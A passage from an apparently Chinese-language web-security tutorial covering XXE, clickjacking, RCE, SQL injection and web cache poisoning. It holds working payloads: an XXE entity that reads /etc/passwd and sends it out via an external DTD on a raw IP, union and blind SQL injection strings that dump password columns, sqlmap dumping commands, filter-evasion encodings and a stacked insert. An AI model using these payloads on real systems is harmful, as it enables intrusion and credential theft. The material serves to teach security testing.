<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd">%dtd;%send;]]>
```

#### 通过修改内容类型进行 XXE 攻击

大多数 POST 请求使用由 HTML 表单生成的默认内容类型，例如application/x-www-form-urlencoded. 一些网站希望接收这种格式的请求，但会容忍其他内容类型，包括 XML。

例如，如果正常请求包含以下内容：

```bash
POST /action HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 7foo=bar
```

然后您可以提交以下请求，结果相同：

```bash
POST /action HTTP/1.0Content-Type: text/xmlContent-Length: 52<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

如果应用程序容忍消息正文中包含 XML 的请求，并将正文内容解析为 XML，那么您只需将请求重新格式化为使用 XML 格式即可到达隐藏的 XXE 攻击面。



### 如何查找和测试 XXE 漏洞

#### 自动化工具

使用 Burp Suite 的Web 漏洞扫描器可以快速可靠地找到绝大多数 XXE 漏洞。

****

XXEinjector的漏洞利用工具，XXEinjector是一款基于Ruby的XXE注入工具，它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。
工具地址 https://github.com/enjoiz/XXEinjector



#### 手动测试

手动测试 XXE 漏洞通常涉及：

通过定义基于众所周知的操作系统文件的外部实体并在应用程序响应中返回的数据中使用该实体来 测试文件检索。
通过根据您控制的系统的 URL 定义外部实体并监视与该系统的交互来 测试盲 XXE 漏洞。
通过使用XInclude 攻击尝试检索众所周知的操作系统文件，测试服务器端 XML 文档中是否包含用户提供的非 XML 数据的漏洞。

### XXE防御方案

几乎所有 XXE 漏洞的出现都是因为应用程序的 XML 解析库支持应用程序不需要或打算使用的潜在危险的 XML 功能。防止 XXE 攻击的最简单和最有效的方法是禁用这些功能。

通常，禁用外部实体的解析并禁用对XInclude. 这通常可以通过配置选项或以编程方式覆盖默认行为来完成。有关如何禁用不必要的功能的详细信息，请参阅 XML 解析库或 API 的文档。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714142934224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 点击劫持（Clickjacking）


### 什么是点击劫持？

点击劫持是一种基于界面的攻击，通过点击诱饵网站中的一些其他内容，诱使用户点击隐藏网站上的可操作内容。请看以下案例：
网络用户访问诱饵网站（可能这是电子邮件提供的链接）并单击按钮以赢取奖品。不知不觉中，他们被攻击者欺骗，按下了一个替代的隐藏按钮，这导致在另一个网站上支付一个帐户。这是一个点击劫持攻击的例子。

该技术取决于在 iframe 中包含一个不可见的、可操作的网页（或多个页面），其中包含一个按钮或隐藏链接。iframe 覆盖在用户预期的诱饵网页内容之上。
![在这里插入图片描述](https://img-blog.csdnimg.cn/021dad5103c3495b9afb860de5b0d61c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)


这种攻击与CSRF攻击的不同之处在于，用户需要执行诸如单击按钮之类的操作，而CSRF 攻击则依赖于在用户不知情或不输入的情况下伪造整个请求。
对 CSRF 攻击的保护通常是通过使用CSRF 令牌来提供的：特定于会话的一次性号码或随机数。CSRF 令牌不会减轻点击劫持攻击，因为目标会话是使用从真实网站加载的内容建立的，并且所有请求都发生在域上。CSRF 令牌被放入请求中并作为正常行为会话的一部分传递给服务器。与普通用户会话相比的不同之处在于该过程发生在隐藏的 iframe 中。

### 点击劫持

## 远程命令执行（RCE）

在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理，这就可能造成被执行敏感命令，如下：

```bash
#  当被执行index.php?page=1;phpinfo()将会产生漏洞$var = $_GET['page'];eval($var);
```

**白盒测试RCE敏感函数**
常见的几种语言都有字符串转化为代码的执行函数
php：eval、assert、system
python：exec
java:OGNL、SpEL

**常出现位置**
明显函数调用了系统命令如ping等

### 实例：网站可执行系统命令

当只允许执行某命令试试管道符。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712125738973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
当弹出这样对话框时，你应该试着去看当前页面的源码，检查是哪个函数导致此结果。
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071213025048.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
前端验证的你可以通过抓包去修改发送的数据包，从而绕过防御
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712131116302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



## SQL注入

**类型**
sql注入按照请求类型分为：GET、POST、cookie注入型
按数据类型分为：数字型、字符型，数字型不用闭合sql语句
测试方法分为：报错型、延时型、盲注型、布尔型

**防御方法**
过滤关键词select等
过滤特殊符号单引号等
数据库权限为最低而不是默认的系统管理员

**学习方法**
学习要走常规方法，还是需要用靶机上手啊！靶机如下
sqli-labs[下载地址](https://github.com/Audi-1/sqli-labs)与[部署到本机方法](https://www.freebuf.com/articles/web/271772.html)，在安装最新版的phpstudy后，你只需要使用恰当的PHP版本>5.3(小于这个版本会自带引号转义模式方法，这不利于快速测试)与你phpstudy的数据库名密码一致的配置文件。


**常见的注入点**
一般而言除了select，有时候select也没有。大多其他数据库操作都无回显。当没有回显时需要用盲注、时间、报错等制作回显。

### 手工注入

先贴出源码吧，但实际中我会按照黑盒测试走

#### 常规注入

```bash
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```

**步骤1.查看有无注入点**

```bash
# 输入：3''		# 或尝试3’ and 1=1--+ 与 3’ and 1=2--+# 在代码中发生了：SELECT * FROM users WHERE id='3'' LIMIT 0,1# 执行结果：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''3'' LIMIT 0,1' at line 1
```

**步骤2.查看有几列**
要输入至少两次来找到临界点

```bash
# 输入第一次：3' order by 4 --+# 在代码中发生了：SELECT * FROM users WHERE id='3' order by 4 -- ' LIMIT 0,1# 执行结果：Unknown column '4' in 'order clause'# 输入第一次：3' order by 3 --+# 在代码中发生了：SELECT * FROM users WHERE id='3' order by 3 -- ' LIMIT 0,1# 执行结果：查询结果
```

**步骤3.信息搜集**
常见搜集database()、version()、user()

```bash
# 输入：-3' union select 1,database(),version() --+# 在代码中发生了：SELECT * FROM users WHERE id='-3' union select 1,database(),version() -- ' LIMIT 0,1# 执行结果：1，database()、版本名version()
```

**步骤4.获得数据库内容**

```bash
# 输入以下语句，为爆表名：-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+# 在代码中发生了：SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- ' LIMIT 0,1# 执行结果：1，2，表名# 输入以下语句，为爆列名：-3'union SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='关注的表名' --+# 在代码中发生了：SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- ' LIMIT 0,1# 执行结果：1，2，列名# 输入以下语句，为获得字段名：-3'union SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='关注的表名' --+# 在代码中发生了：SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(password) from users-- ' LIMIT 0,1# 执行结果：1，2，字段名
```

##### 变种分析

这里的变种是以下段代码为基准

```bash
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```

闭合符号不一样

```bash
SELECT * FROM users WHERE id LIMIT 0,1SELECT * FROM users WHERE id="$id" LIMIT 0,1SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```

结论：黑盒注入你首先要先对前面的单引号或双引号进行闭合。具体是单引号还是双引号，要手工尝试分析

####  盲注

大概写了个形式代码，其执行逻辑类似于如下。这逻辑结果导致网站的数据库结果不会直接显示在页面上，对于有查询结果的

```bash
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";if(有查询结果){ 	echo 'You are in...........';}
```


**经验：多个参数注入一个点**
如果链接是 url/?id=1&page=2
id存在注入点，page不存在。这时候你的注入应该采取以下策略：

1. 交换顺序。将url/?id=1&page=2换成url/?page=2&id=1
2. 注入语句插对位置。url/?id=1 and 1=1 &page=2

对于工具你应该告诉它注入点位置，即加一个星号

```bash
url/?id=1*&page=2
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715234717488.png)



### 制造回显

常用方法如下:
基于布尔的SQL盲注-逻辑判断(不需要回显信息就能看到)(2)
regexp，like，ascii，left，ord，mid

基于时间的SQL盲注-延时判断(不需要回显信息就能看到)(3)
if，sleep

基于报错的SQL盲注-报错回显(优先于选择:1)


#### 报错回显

##### bool类型注入

基于布尔的 SQL 注入要求攻击者向数据库服务器发送一系列布尔查询并分析结果，以推断任何给定字段的值。假设我们发现了一个容易受到盲注攻击的字段，我们想找出用户名。为了做到这一点，我们需要了解一些重要的功能；大多数数据库使用这些的一些变体：
ASCII(character)
SUBSTRING(string, start, length)
LENGTH(string)

###### 制作布尔查询

**慢慢尝试**
通过使用这些函数，我们可以开始测试第一个字符的值，一旦确定，我们就可以继续下一个，依此类推，直到整个值（在这种情况下，用户名）被发现。看看下面的 URL，我们知道它很容易通过插入尾随单引号被注入：

```bash
https://exampleurl.com/login.php?id=1'
```

使用布尔漏洞利用，我们可以制作要在服务器上执行的查询，最终看起来像这样：

```bash
SELECT  *FROM    UsersWHERE   UserID = '1' AND ASCII(SUBSTRING(username,1,1)) = 97 AND '1' = '1'
```

让我们分解一下。内部函数总是先执行，所以 SUBSTRING() 取用户名字符串的第一个字符并将长度限制为 1；这样，我们可以一次遍历每个字符，直到到达字符串的末尾。

接下来，ASCII() 函数以我们刚获得的字符作为参数运行。语句的其余部分基本上只是一个条件：如果这个字符的 ASCII 值等于 97（即“a”），并且 1=1 为真（它总是如此），那么整个语句是真的，我们有正确的性格。如果返回 false，那么我们可以将 ASCII 值从 97 增加到 98，并重复该过程直到它返回 true。

例如，如果我们知道用户名是“jsmith”，那么在达到 106（即“j”的 ASCII 值）之前，我们不会看到返回 true。一旦我们获得了用户名的第一个字符，我们就可以通过重复此过程并将 SUBSTRING() 的起始位置设置为 2 来继续下一个字符
**结束程序**
测试基于布尔的注入时需要做的最后一件事是确定何时停止，即知道字符串的长度。一旦我们达到空值（ASCII 代码 0），那么我们要么完成并发现整个字符串，要么字符串本身包含一个空值。我们可以通过使用 LENGTH() 函数来解决这个问题。假设我们试图获取的用户名是“jsmith”，那么查询可能如下所示：

```bash
SELECT  *FROM    UsersWHERE   UserID = '1' AND LENGTH(username) = 6 AND '1' = '1'
```

如果返回 true，则我们已成功识别用户名。如果返回 false，则字符串包含空值，我们需要继续该过程，直到发现另一个空字符。

##### 时间SQL注入

IF() 函数接受三个参数：条件、条件为真时返回什么、条件为假时返回什么。
MySQL 还有一个名为 BENCHMARK() 的函数，可用于基于时间的注入攻击。将执行表达式的次数作为其第一个参数，将表达式本身作为第二个参数。

###### 制作时间SQL注入

基于时间的 SQL 注入涉及向数据库发送请求并分析服务器响应时间以推断信息。我们可以通过利用数据库系统中使用的睡眠和时间延迟功能来做到这一点。像以前一样，我们可以使用 ASCII() 和 SUBSTRING() 函数来帮助枚举字段以及名为 SLEEP() 的新函数。让我们检查以下发送到服务器的 MySQL 查询：

```bash
SELECT  *FROM    UsersWHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, SLEEP(10), 'false')
```

基本上，这表明如果用户名的第一个字符是“a”(97)，则运行 CURTIME() 一千万次。CURTIME() 返回当前时间，但这里传递的函数并不重要；但是，重要的是要确保该函数运行足够多的时间以产生重大影响。

```bash
WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, BENCHMARK(10000000, CURTIME()), 'false')
```

###### 其他数据库的时间注入

PostgreSQL 使用 pg_sleep() 函数：

```bash
WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, pg_sleep(10), 'false')
```




### sql注入过程：sqlmap

使用sqlmap 步骤是：

```python
# 1.判断链接是否可注入# 手工:当你想要寻找界面是否含有注入点，你应该警惕源码中含有?的URL链接测试比如？id=1和？id=1'看界面返回区别，或者是附上？id=1 and 1=1 和？id=1 and 1=2；或者是+1 和-1 注意这里+在url编码中有特殊含义，记得将+编码为%2bsqlmap -u URL --level 5 --batch --random-agent#  当url参数大于1时需要将url用“”引起来。# 2. 如果可注入，查询当前用户下所有数据库。不可注入的话，就没有后续步骤了。# 手工: order by 3# 手工: id=-1 union select 1, database(), 3 # UNION的作用是将两个select查询结果合并sqlmap -u URL --dbs # --dbs也可以缩写为-D# 3. 如果可查询到数据库，则进行查询数据库中表名sqlmap -u URL -D 数据库名  --tables # --tables可以缩写为-T# 4.规则同上sqlmap -u URL -D 数据库名  -T 表名 --columns # 5.规则同上，字段内容sqlmap -u URL -D 数据库名  -T 表名  -C 列名 --dump
```

其他有用命令

```python
sqlmap -u URL --userssqlmap -u  URL --passwords # 要是密码加密请在网站cmd5中解密sqlmap -u URL --current-dbsqlmap -u URL --current-user
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204428465.png)
你可以点击以下文章以便了解更多使用
[这篇热门文章对sqlmap做了详细的解释](https://www.freebuf.com/sectool/164608.html)
[sqlmap使用简要版](https://blog.csdn.net/weixin_43729943/article/details/104169193)
sqlmap tamper使用
**sql其他注入工具**
sqlmap
Pangolin
Havij
**防止SQL注入**
严格验证数据类型、长度和合法的取值范围
特殊字符转义

**经验**
前辈经验发现：sql注入还可能存在注册中输入号码部分；

#### tamper 自定义

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708185301610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708190916943.png)
sqlmap在发送请求数据包中user-agent直接申明自己名号，很多防火墙轻易就将此查杀。


### 跨域连接

也只有是root权限你才可以去查询数据库名即show schemata ，而前面的show databases()查询的是当前数据库，这不满足我们的需求
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705180515958.png)




### SQL注入常见防御

1. url/?id=MQ== 类似于这样的链接，这样的链接是经过base64编码的，因此你在测试这个网站有没有注入点时，你需要先将id进行解码，然后合并你的注入语句比如id=1 and 1=2 一起经过同等类型的编码；当然也有不少网站为了安全采用了自己的加密算法，这时候你也许就不能找到漏洞了。


**addslashes/magic_quotes_gps=on**
addslashes/magic_quotes_gps=on将会导致：函数返回在预定义字符之前添加反斜杠的字符串。
预定义字符是：
单引号（'）
双引号（"）
反斜杠（\）
NULL

这很好绕过，用hex进行编码后就可以或二次注入或宽字节或双层URL编码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705184435881.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070518451262.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705185955596.png)

**判断类型**
这种方法更常见，目前很难被绕过，有人说可以溢出绕过，或者试试2进制，我后续多查查资料再补充一下。![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070519112684.png)
一个网站的防注入通常都是全局配置的，有的参数是应该被允许用字符型的。如果一个个写这种特定过滤会使得代码不美观，有的程序员会因此放弃这种好的写法。但一些点对点红蓝攻击多数会使用这种办法。

**关键字过滤**
比如过滤大小写、select等


**session 进行参数绑定**
利用session防御，session内容正常情况下是用户无法修改的select * from users where user = "'" + session getAttribute("userID") + "'";

### 绕过防御

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705211048981.png)



#### 静态资源

特定的静态资源后缀请求，常见的静态文件(.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求，因为Waf认为一般图片和文本格式或其他静态脚本都是无害的。
老版本WAF可以这么绕过，现在的不行了
http://10.9.9.201/sql.php?id=1
http://10.9.9.201/sql.php/1.txt?id=1
备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。

#### 爬虫白名单

部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：
1.根据UserAgent 
2.通过行为来判断
UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。这种技术用在ip被封锁，或者频繁扫描请求中
User Agent Switcher (firefox 附加组件)，下载地址：
https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/
伪造成百度爬虫
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708170647879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 版本绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708172007570.png)
union 和select 放一起就会被墙，用以下方法就是安全的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708172342231.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708172930538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 空白

我们可以用来尝试逃避签名检测的第一种方法是利用空白。添加额外的空格或特殊字符（如制表符或换行符）不会影响 SQL 语句，但可能会通过过滤器获取恶意负载。制表符或换行符也不会影响语句

#### 空字节

通常，过滤器会阻止某些字符在 SQL 语句中执行。这可能是阻止攻击的最常见方式，因为如果没有撇号或破折号等特殊字符，注入不太可能成功。

解决此问题的一种方法是在任何被阻止的字符前使用空字节(%00)。例如，如果我们知道应用程序正在阻止撇号，则可以使用以下注入来欺骗过滤器以允许它们：

```bash
%00' or 1=1--
```

#### 网址编码

另一种避免检测的方法是使用 URL 编码。这种类型的编码用于通过 HTTP 通过 Internet发送Web 地址信息。由于 URL 只能包含 ASCII 值，因此任何无效字符都需要编码为有效的 ASCII 字符。URL 也不能包含空格，因此它们通常被转换为 + 号或 %20。通过使用 URL 编码屏蔽恶意 SQL 查询，可以绕过过滤器。以下面的注入为例：

```bash
' or 1=1--
```

使用 URL 编码，它看起来像：

```bash
%27%20or%201%3D1--
```

#### 十六进制编码（HEX）

有助于逃避检测。例如：

```bash
SELECT * FROM Users WHERE name='admin'--
```

十六进制编码的等效项将是：

```bash
SELECT * FROM Users WHERE name=61646D696E--
```

或者，我们可以使用 UNHEX() 函数来实现相同的结果：

```bash
SELECT * FROM Users WHERE name=UNHEX('61646D696E')--
```

#### 字符编码

字符编码的工作方式与十六进制编码类似，因为原始 SQL 语句中的字符被替换为转换后的值。这种类型的编码使用 CHAR() 函数将字符编码为十进制值。
看看下面的查询：

```bash
SELECT * FROM Users WHERE name='admin'--
```

```bash
SELECT * FROM Users WHERE name=CHAR(97,100,109,105,110)--
```

#### 字符串连接

另一种用于绕过过滤器的方法是字符串连接。我们在之前的教程中介绍了字符串连接，但这里也可以应用相同的概念；我们通常可以通过分解恶意 SQL 查询中的关键字来避免检测。请记住，不同的数据库系统之间的字符串连接会有所不同。让我们看看下面的语句：

```bash
SELECT * FROM Users WHERE id=1
```

mysql

```bash
CONCAT('SEL', 'ECT') * FROM Users WHERE id=1
```

PostgreSQL：

```bash
'SEL' || 'ECT' * FROM Users WHERE id=1
```

甲骨文（两个选项）：

```bash
CONCAT('SEL', 'ECT') * FROM Users WHERE id=1
```

```bash
'SEL' || 'ECT' * FROM Users WHERE id=1
```

#### 注释

滥用 SQL 处理内联注释的方式还有助于在执行 SQL 注入攻击时绕过过滤器并避免检测。由于语句中可以有任意数量的注释并且仍然有效，我们可以使用它们来分解查询并可能绕过任何存在的过滤器。例如，我们可以在关键字之间插入注释，如下所示：

```bash
SELECT/**/*/**/FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'--
```

#### 组合

有时，即使是这些签名规避技术本身也不会成功，但我们可以将它们结合起来，以进一步提高我们成功绕过防御并完成攻击的机会。例如，假设我们正在攻击的应用程序上的过滤器不允许使用注释字符。为了解决这个问题，我们可以尝试制作一个对这些字符进行编码的查询，以欺骗过滤器允许它们。失败的原始查询：

```bash
SELECT/**/*/**/FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'--
```

使用 URL 编码屏蔽注释字符的相同查询：

```bash
SELECT%2F%2A%2A%2F%2A%2F%2A%2A%2FFROM%2F%2A%2A%2FUsers%2F%2A%2A%2FWHERE%2F%2A%2A%2Fname%2F%2A%2A%2F%3D%2F%2A%2A%2F%E2%80%99admin%E2%80%99--
```


#### 二次注入

二次注入通常需要利用insert和update，当过滤魔术方法时，insert语句通常会将转义的字符在数据库中自动还原通过再次取出相应的词就可以逃逸魔术方法了。另外如果存在此漏洞还可以进行任意用户的密码修改等。
下图是魔术方法逃逸
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707121240712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
二次注入危害与sql注入相同，但二次注入要更加的隐蔽。它的存在数量要远小于直接性的SQL注入



**如何发现二次注入**
没有工具，这种漏洞具有一点逻辑层面的感觉。直接用扫描器扫不出来的，基本只能靠人力。
**实例**
注册新用户
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122604565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122623934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
登录进行修改密码界面，把原始密码123456修改成xxxxxx
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707125422301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
修改完成，查看数据库，修改密码的账号为dhakkan
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070712550637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
查看源码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707125644184.png)


### 注入拓展

#### dnslog带外注入

这个漏洞需要注入的目标是需要当前注入用户拥有最高权限，且有权限进行读写操作。你可能疑惑这个能读写了难道后门不就随便写吗。事实上这个方法是用在你无法写入后门时..解决了盲注不能回显数据，效率低的问题。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707133513883.png)
使用方法就是执行下面语句
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707133521556.png)
其中上面ek0j...是来源于下面这个网站
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707133527305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
诸如演示脚本演示
工具：https://github.com/ADOOO/DnslogSqlinj
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707140410167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707140435658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070714044817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### json格式数据包

有的网站对语句使用json格式传输
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706111016493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

这在APP中登录或者上传却很常见.这种注入应该将语句写入json中，如图对a进行注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706110730264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### insert 注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706001251209.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706001309195.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706001523973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 加密参数

要想自动化测试，就需要对输入的参数进行编码。这里进行了文件中转。再用sqlmap调用这个函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707210151862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707210416830.png)

####  堆叠查询注入

Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。
下图展示了堆叠的sql语句是什么样的以及执行结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211416398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎的不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些数据。比如mysql支持堆叠写法，但是redis等其他数据库是不支持这种写法的

实例：堆叠注入(多语句)

```bash
http://127.0.0.1/sqli-labs/Less-38/?id=1';insert into users(id,username,password) values ('38','less38','hello')--+
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211527463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211534991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
堆叠注入用处：注入需要管理员账号密码，密码是加密，无法解密，使用堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录。
mtype:会员类别
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211556997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### cookie 注入

sqlmap -u "http://www.xx.com/xxx.asp" --cookie "id=XXX cookie" --level 2 ＼
cookie注入 后接cookie值
当网站依靠cookie结果做数据库查询，且不做过多的防护就会存在注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705235758892.png)

## 网页缓存攻击


### 什么是网页缓存中毒？

**什么是缓存**

即为了降低网站主机的负载，在固定的时间内保存（缓存）对特定请求的响应。如果另一个用户在这段时间内发送了同样的请求，则缓存会直接提供响应的副本(缓存)给用户，而无需与服务器直接进行交互。

**缓存怎么使用**

那CDN怎么知道用户要访问的是同一个页面呢？(实际上除了CDN还有其他的缓存技术，这里以CDN为例，其他的暂不了解)

当缓存接收到HTTP请求的时候，它会匹配vary头部指定的HTTP HEADER来进行判断。当指定的头部与缓存中的数据匹配时，则提供缓存的内容。如果不匹配，就直接与服务器交互。这些指定的头部被称作：缓存键 “cache key”。其他的头部就是非缓存键。

**缓存投毒是什么**

即攻击缓存的界面，当其他用户再请求此缓存界面时，就会导致访问到恶意的缓存界面

### Web 缓存中毒攻击的影响是什么？

Web 缓存中毒的影响在很大程度上取决于两个关键因素：

**攻击者究竟能成功获得什么缓存**
由于中毒缓存更多是一种分发手段而不是独立攻击，因此 Web 缓存中毒的影响与注入的有效负载的危害程度密不可分。与大多数类型的攻击一样，Web 缓存中毒也可以与其他攻击结合使用，以进一步扩大潜在影响。
**受影响页面上的流量**
